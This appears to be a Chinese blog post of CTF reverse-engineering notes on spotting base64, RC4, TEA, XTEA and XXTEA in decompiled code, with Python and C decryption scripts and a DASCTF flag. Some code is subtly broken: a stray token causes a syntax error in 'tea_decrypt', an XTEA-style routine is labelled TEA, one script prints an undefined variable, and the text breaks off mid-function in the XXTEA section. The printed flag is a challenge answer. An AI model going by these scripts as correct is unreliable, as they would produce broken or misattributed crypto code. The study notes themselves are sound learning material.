    <url>/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>1byte-&gt;2**n bytes</p><ul><li>非对称加密：RSA ECC SM2 SM9</li><li>哈希：MD5 SHA SM3</li><li>base58（整除）</li></ul><p>1byte-&gt;n bytes</p><ul><li>分组：SM1 SM4 SM7</li><li>base16,32,64,85</li></ul><p>1byte-&gt;1 byte</p><ul><li>替换密码</li><li>RC4 ZUC</li></ul><h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><p>核心：三转四</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689236059101-693a1652-dd19-464f-9730-cac9a18f55b2.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689236688306-efc39010-7dc0-4bf0-8a7d-49d3922156e8.png" class="" title="img"><p>补充一下我对倒数第四行的的困惑及解释：字母和3进行与操作只保留字母的二进制最后两位，左移4相当于给低四位加0，一共是六位；后半部分直接右移4，相当于只剩4位，两数取或运算后面的数虽然只有4位，但前面可以补0，且一个数跟0进行或运算取决于它自身，所以一共是6位</p><p>有时候会是下面的形式，主要一下子没看出来，记录一下。发现&gt;&gt;2和&amp;0x3f还是在的，另外一些用位操作代替了，且对字符串的长度根据%3的余数做了分类</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689664419744-c0e1d41e-b126-49b8-9a8a-48e0eb368f86.png" class="" title="img"><p>也有这种位运算之后全是&amp;0x3f的</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1694240916741-6f8d2997-bcbf-40f6-af75-042c3b24aae3.png" class="" title="img"><p>%3和&#x3D;告诉我下面的也是base64</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1722498705970-3564e836-8165-4298-b3fc-b8ee8d848a81.png" class="" title="img"><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>1.先初始化状态向量S（用来作为密钥流生成的种子1）</p><p>2.<strong>初始密钥key（由用户输入）</strong>，长度任意,如果输入长度小于256个字节，则进行循环，直到填满k,有时候k用t来表示</p><p>3.开始对状态向量S进行置换操作（用来打乱初始种子1）</p><p><strong>KSA</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689682750988-bfb173d7-d35f-4f0a-bc76-3a0be2c2b817.png" class="" title="img"><p>4.生成密钥</p><p><strong>PGRA</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1689686114595-4174755a-78fb-47f4-9f2a-49b2685a4280.png" class="" title="img"><p>rc4也可以&amp;255(0xff)</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707662727122-9584da0c-e567-491b-ab9d-4e95ce14cdd0.png" class="" title="img"><p><strong>在rc4中，key通常为初始化函数的中间参数，可以快速找到</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xB2</span>])<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x43</span>]*<span class="hljs-number">18</span>)<br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><p>%128的魔改本质上就是8位二进制数组成的密钥变为7位</p><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>一种对称算法，它使用64位明文（一组密文，2<em>32位）和128位密钥（一般是4</em>32位）进行加解密</p><p>TEA系列算法中均使用一个DELTA常数，但DELTA的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA的值十六进制值为<strong>0x9e3779B9</strong>，用于保证每一轮加密都不相同</p><h3 id="标准加密流程"><a href="#标准加密流程" class="headerlink" title="标准加密流程"></a>标准加密流程</h3><ol><li>将明文按64位分组，将每个分组视为一个64位的二进制数，记为V </li><li>将128位的密钥分成<strong>4个32位的子密钥</strong>，分别记为K0、K1、K2、K3</li><li>将明文分组V分为两个32位的部分，分别记为V0和V1</li><li>设定一个32位的常数delta</li><li>TEA算法的加密过程包括32轮迭代，每一轮的加密过程如下：</li></ol><p>  a. 首先，累加器sum被初始化为0</p><p>  b. 接着，将delta值加到sum中。delta是一个常数，其值通常为0x9e3779b9，用于增加加密的随机性<br>  c. 然后，将V1左移4位，加上K0，再异或上(V1+sum)和(V1右移5位+K1)的值。得到的结果作为V0的新值<br>  d. 接下来，将V0左移4位，加上K2，再异或上(V0+sum)和(V0右移5位+K3)的值。得到的结果作为V1的新值<br>  e. 重复上述步骤32次，即完成一轮迭代。在每一轮迭代中，V0和V1的值都会被更新，其中V1的更新依赖V0，而V0的更新依赖于V1</p><ol><li>经过32轮迭代后，得到加密后的密文，记为C0和C1 </li><li>将C0和C1按顺序连接起来，得到64位的密文</li></ol><h3 id="算法注意点"><a href="#算法注意点" class="headerlink" title="算法注意点"></a>算法注意点</h3><p>key一般为加密函数第二个参数，<strong>sum-&#x3D;0x61c88647和sum+&#x3D;0x9e3779b9是等价的</strong></p><p>循环里的l和r一般用v0和v1，这样不容易弄混</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">tea_encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* v, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* key)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        l += (((r &lt;&lt; <span class="hljs-number">4</span>) ^ (r &gt;&gt; <span class="hljs-number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        sum += DELTA;<br>        r += (((l &lt;&lt; <span class="hljs-number">4</span>) ^ (l &gt;&gt; <span class="hljs-number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]); <br>    &#125;<br>    v[<span class="hljs-number">0</span>] = l;<br>    v[<span class="hljs-number">1</span>] = r;<br>&#125;<br><br><span class="hljs-comment">//利用可逆性将加密过程逆转</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">tea_decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* v, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* key)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l = v[<span class="hljs-number">0</span>], r = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0</span>;<br>    sum = DELTA * <span class="hljs-number">32</span>; l<br>    <span class="hljs-title function_">for</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)</span> &#123;<br>        r -= (((l &lt;&lt; <span class="hljs-number">4</span>) ^ (l &gt;&gt; <span class="hljs-number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum -= DELTA;<br>        l -= (((r &lt;&lt; <span class="hljs-number">4</span>) ^ (r &gt;&gt; <span class="hljs-number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = l;<br>    v[<span class="hljs-number">1</span>] = r;<br>&#125;<br></code></pre></td></tr></table></figure><p>有些时候伪代码*4但实际上并不需要，因为这时的key是一个字节</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1724145418625-3419bc86-ade4-4d2d-8ab4-0c9287ff8738.png" class="" title="img"><p>注意v0和v1到底是int还是unsigned int</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1730958458935-aeab96b1-8b7c-4fc9-9571-ded865d59c3a.png" class="" title="img"><p>有多步操作的时候一定要注意写for循环的时候也要逆向，下面每次循环都要进行异或，自然得从后往前逆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *k)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> sum = delta * <span class="hljs-number">16</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>        sum -= delta;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> enc[<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-number">0xBC2B4DF9</span>, <span class="hljs-number">0x6213DD13</span>, <span class="hljs-number">0x89FFFCC9</span>, <span class="hljs-number">0x0FC94F7D</span>, <span class="hljs-number">0x526D1D63</span>, <span class="hljs-number">0xE341FD50</span>, <span class="hljs-number">0x97287633</span>, <span class="hljs-number">0x6BF93638</span>, <br>    <span class="hljs-number">0x83143990</span>, <span class="hljs-number">0x1F2CE22C</span><br>    &#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key[<span class="hljs-number">4</span>] = &#123;<br>    <span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x09101112</span>, <span class="hljs-number">0x13141516</span>, <span class="hljs-number">0x15161718</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">2</span>; i-=<span class="hljs-number">2</span>)<br>    &#123;<br>        enc[i] ^= enc[<span class="hljs-number">1</span>];<br>        enc[i - <span class="hljs-number">1</span>] ^= enc[<span class="hljs-number">0</span>];<br>        decrypt(enc, key);<br>    &#125;<br>    decrypt(enc, key);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, enc);<br>&#125;<br><span class="hljs-comment">// DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;</span><br></code></pre></td></tr></table></figure><p>tea算法会有很多魔改的地方，比如循环次数，算法中多异或几个数，下面在tea的前后还实现了交换</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1705325961046-680c058b-ba27-4aa7-97a0-7092a31fa9a1.png" class="" title="img"><p>如果算法里面异或i的话里面的循环也要逆着写</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1731857724576-3ca1a863-8cf9-4ca5-bac0-53045be9b033.png" class="" title="img"><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><p>由于涉及内存指针等问题，大部分用c写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>]);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0;<br>    v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x11121314</span>, <span class="hljs-number">0x22232425</span>, <span class="hljs-number">0x33343536</span>, <span class="hljs-number">0x41424344</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0x38b97e28</span>, <span class="hljs-number">0xb7e510c1</span>, <span class="hljs-number">0xb4b29fae</span>, <span class="hljs-number">0x5593bbd7</span>,<span class="hljs-number">0x3c2e9b9e</span>, <span class="hljs-number">0x1671c637</span>, <span class="hljs-number">0x8f3a8cb5</span>, <span class="hljs-number">0x5116e515</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>) &#123;<br>        decrypt(&amp;v5[i], key);<br>    &#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>tea加密的另一种模式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x61C88747</span>, sum = delta * (<span class="hljs-number">-64</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])^v0;<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>])^v1;<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>,<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0xC19EA29C</span>,<span class="hljs-number">0xDC091F87</span>,<span class="hljs-number">0x91F6E33B</span>,<span class="hljs-number">0xF69A5C7A</span>,<span class="hljs-number">0x93529F20</span>,<span class="hljs-number">0x8A5B94E1</span>,<span class="hljs-number">0xF91D069B</span>,<span class="hljs-number">0x23B0E340</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">8</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>从做题角度来说差别不大</p><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>相比xtea与tea，xxtea的复杂度更上了一层，subkey的方式变为已进行的轮数的最后两位与delta叠加的最后两位相异或，delta迭代与tea相同，常见是9轮循环，循环里面先q再p，q就是循环的次数，为<strong>6+52&#x2F;(n+1)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5) ^ (y <span class="hljs-string">&lt;&lt; 2)) + ((y &gt;</span>&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><br><span class="hljs-comment">//XXTEA 加密，在处理数据流中每个数据时利用了相邻数据，使用MX函数计算加密值</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> * <span class="hljs-title function_">xxtea_uint_encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * data, <span class="hljs-type">size_t</span> len, <span class="hljs-type">uint32_t</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = (<span class="hljs-type">uint32_t</span>)len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> z = data[n], y, p, q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / (n + <span class="hljs-number">1</span>), sum = <span class="hljs-number">0</span>, e;<br><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> data;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span> &lt; q--) &#123;<br>        sum += DELTA;<br>        <span class="hljs-comment">// 根据sum 计算得出0~3中的某一个数值, 用于MX中与p共同作用选择key数组中某个秘钥值</span><br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br><br>        <span class="hljs-comment">//遍历每个待加密的数据</span><br>        <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n; p++) &#123;<br>            <span class="hljs-comment">//z的初值为data[len - 1]，即将数据数组当做是环形队列来处理的，首尾相连，当加密data[0]时，需要用到data[len - 1]，data[0]，data[0 + 1]，以及MX计算返回的的一个加密值，加密值与data[0]相加后达到加密的效果</span><br>            y = data[p + <span class="hljs-number">1</span>];<br>            z = data[p] += MX;<br>        &#125;<br><br>        <span class="hljs-comment">//当加密data[len-1]时，需要用到data[len - 2]，data[len-1]，data[0]，以及MX计算返回的的一个加密值，加密值与data[len-1]相加后达到加密的效果</span><br>        y = data[<span class="hljs-number">0</span>];<br>        z = data[n] += MX;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> * <span class="hljs-title function_">xxtea_uint_decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * data, <span class="hljs-type">size_t</span> len, <span class="hljs-type">uint32_t</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = (<span class="hljs-type">uint32_t</span>)len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> z, y = data[<span class="hljs-number">0</span>], p, q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / (n + <span class="hljs-number">1</span>), sum = q * DELTA, e;<br><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> data;<br><br>    <span class="hljs-keyword">while</span> (sum != <span 